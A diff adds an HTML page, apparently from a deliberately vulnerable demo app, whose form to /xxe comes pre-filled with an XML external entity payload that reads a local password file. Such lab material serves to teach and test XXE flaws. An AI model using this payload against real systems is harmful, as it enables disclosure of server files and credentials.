@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Xml External Entity</title>
+    <link rel="stylesheet" href="bootstrap-4.3.1-dist/css/hacker.css"/>
+</head>
+<body>
+<div>
+    <h3>Xml Area</h3>
+    <form action="/xxe" method="post">
+        <textarea name="xml" style="width: 100%; height: 500px">
+<?xml version="1.0" encoding="ISO-8859-1"?>
+            <!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM
+  "file:///home/turbulence6th/password.txt">
+]>
+<foo>
+  &xxe;
+</foo>
+        </textarea><br>
+        <button type="submit">Submit</button>
+    </form>
+</div>
+</body>
+</html>
